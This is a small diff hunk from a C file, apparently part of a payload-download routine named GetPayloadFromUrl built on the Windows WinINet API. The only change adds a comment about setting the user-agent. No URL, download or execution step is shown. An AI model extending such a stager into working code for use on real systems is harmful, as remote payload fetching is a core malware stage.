@@ -7,8 +7,8 @@ BOOL GetPayloadFromUrl() {
     PBYTE pBytes = NULL;
     DWORD dwBytesRead = 0;
     BOOL result = FALSE;
-
-    hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    
+    hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // write your own user-agent or equal NULL
     if (hInternet == NULL) {
         printf("[!] InternetOpenW Failed With Error : %d\n", GetLastError());
         return FALSE;
